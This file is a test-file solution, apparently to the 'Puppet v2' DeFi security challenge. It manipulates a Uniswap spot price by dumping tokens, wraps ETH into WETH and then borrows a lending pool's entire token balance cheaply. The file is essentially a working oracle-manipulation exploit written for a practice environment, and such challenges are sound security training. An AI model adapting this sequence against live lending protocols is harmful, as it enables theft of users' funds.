...
describe('[Challenge] Puppet v2', function () {
    ...
    it('Exploit', async function () {
        ...
        const uniswapRouter = this.uniswapRouter.connect(attacker);
        let tx = await this.token.connect(attacker).approve(uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);
        await tx.wait();
        ...
        tx = await uniswapRouter.swapExactTokensForETH(
            ...
            attacker.address,
            (await ethers.provider.getBlock('latest')).timestamp * 2, { gasLimit: 3e7});
        await tx.wait();

        const balance = await ethers.provider.getBalance(attacker.address);
        tx = await this.weth.connect(attacker).deposit({value : balance.sub(ethers.utils.parseEther('0.1'))});
        await tx.wait()

        expect(await this.weth.balanceOf(attacker.address)).to.be.eq(balance.sub(ethers.utils.parseEther('0.1')));

        const lenderPool = this.lendingPool.connect(attacker);
        tx = await this.weth.connect(attacker).approve(lenderPool.address, ethers.utils.parseEther('1000'));
        await tx.wait()

        tx = await lenderPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
        await tx.wait();
    });
